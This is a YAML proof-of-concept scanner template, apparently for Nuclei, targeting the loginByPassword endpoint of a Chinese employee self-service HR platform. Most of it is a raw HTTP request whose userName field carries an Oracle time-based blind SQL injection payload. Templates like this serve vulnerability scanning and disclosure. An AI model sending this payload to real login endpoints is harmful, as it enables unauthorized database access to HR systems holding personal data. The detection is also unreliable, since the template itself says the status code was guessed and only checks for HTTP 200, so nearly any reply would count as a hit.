id: poc-79a483fcc0bcb0ff29fb
info:
  name: 员工自助平台loginByPassword存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
http:
- raw:
  - 'POST /hrssc/portal/plantform/loginByPassword HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/plain, */*

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

    Content-Type: application/json

    Accept-Encoding: gzip, deflate, br

    Accept-Language: zh-CN,zh;q=0.9

    Content-Length: 40

    Connection: close


    {"userName":"admin'' AND 8383=DBMS_PIPE.RECEIVE_MESSAGE(CHR(76)||CHR(98)||CHR(97)||CHR(122),5)-- eWnt","password":"admin"}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
